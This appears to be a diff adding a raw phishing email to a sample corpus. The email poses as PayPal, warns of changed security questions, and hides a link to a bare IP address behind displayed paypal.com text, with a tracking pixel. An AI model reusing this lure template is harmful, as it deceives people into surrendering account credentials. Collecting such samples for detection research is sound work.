@@ -1,0 +1,104 @@
+From nobody Sun Jan 25 13:50:02 2015
+Return-Path: <root@rhfw.site>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+ by example.com (Postfix) with ESMTP id 2D3CB46966
+ for <user@login.example.com>; Thu, 15 Mar 2007 20:00:46 -0400 (EDT)
+Received: from mail.example.org (mail.example.org [192.168.6.4])
+ by mail.example.org (Postfix) with ESMTP id 4C9F6131FD56
+ for <user@example.com>; Thu, 15 Mar 2007 20:00:46 -0400 (EDT)
+Received: from rhfw.site (static-ip-203-89-172-23.watchdog.net.nz
+ [203.89.172.23])
+ by mail.example.org (Postfix) with ESMTP id D01876FA1A8
+ for <user@example.com>; Thu, 15 Mar 2007 20:00:45 -0400 (EDT)
+Received: by rhfw.site (Postfix, from userid 0)
+ id 1386220B759; Fri, 16 Mar 2007 10:15:08 +0000 (GMT)
+To: user@example.com
+Subject: Important Notification.
+Message-ID: <1174040108.16562.qmail@paypal.com>
+From: "PayPal Security Service." <service@paypal.com>
+Content-Type: text/html
+Date: Fri, 16 Mar 2007 10:15:08 +0000 (GMT)
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 973
+
+<html>
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+<title>PayPal</title>
+
+</head>
+<body>
+
+<table cellspacing="0" cellpadding="0" width="600" align="center" border="0">
+    <tr>
+	<td><img height="35" alt="PayPal" 
+	    src="http://www12.asphost4free.com/tracking/p/paypal_logo.gif" width="117" 
+	    vspace="10" border="0"></td>
+    </tr>
+</table>
+
+
+<table cellspacing="0" cellpadding="0" width="600" align="center" border="0">
+    <tr valign="top">
+	<td><img height="1" src="http://www.paypal.com/images/pixel.gif" width="5"></td>
+	<td align="left" width="100%">
+	    <table cellspacing="0" cellpadding="0" width="100%" align="center" border="0">
+		<tr>
+		    <td><font face="verdana,arial,helvetica,sans-serif" size="2">
+
+			<br>
+
+The security questions and answers for your PayPal account were changed on March 16, 2007.
+If you did not authorize this change,please contact us immediately using this:<br>
+<a href="http://208.64.226.118/~oracle/index.html" 
+target="blank"><strong>https://www.paypal.com/cgi-bin/webscr?cmd=_login-run</strong></a>
+<br><br>However, You will need to update some of your records in our Resolution center
+if not will result account suspension.<br><br> For more information on protecting yourself from fraud, please review 
+the
+Security Tips in our Security Center. Please update your records.<br><br>
+
+Sincerely, 
+			<br>
+			<br>
+
+PayPal
+		    </font></td>
+		</tr>
+		<tr>
+		    <td><br><img height="5" src="http://www.paypal.com/images/dot_row_long.gif" 
+			width="590"></td>
+		</tr>
+
+		<tr>
+		    <td><font face="verdana,arial,helvetica,sans-serif" color=#aaaaaa size="1">
+			<br>
+To modify your notification preferences, log in to your 
+PayPal account, click the Profile sub-tab, then click the Notifications link under Account Information. Changes 
+may take up to 10 days to be reflected in our mailings. PayPal will not sell or rent any of your personally 
+identifiable 
+information to third parties. For more information about the security of your information, read our Privacy Policy. 
+			<br>
+			<br>
+
+Copyright&copy; 2007 PayPal Inc. All rights reserved. Designated trademarks and brands are the property of their 
+respective 
+owners. PayPal is located at 2211 N. First St., San Jose, CA 95131.
+ 
+		    </font></td>
+		</tr>
+	    </table>
+	</td>
+    </tr>
+</table>
+
+
+<img src="http://link.p0.com/1x1.dyn?0fkH0xu9hoI577XXAm37=0" width=1 height=1  width="1" height="1" border="0">
+</body>
+</html></html>
+
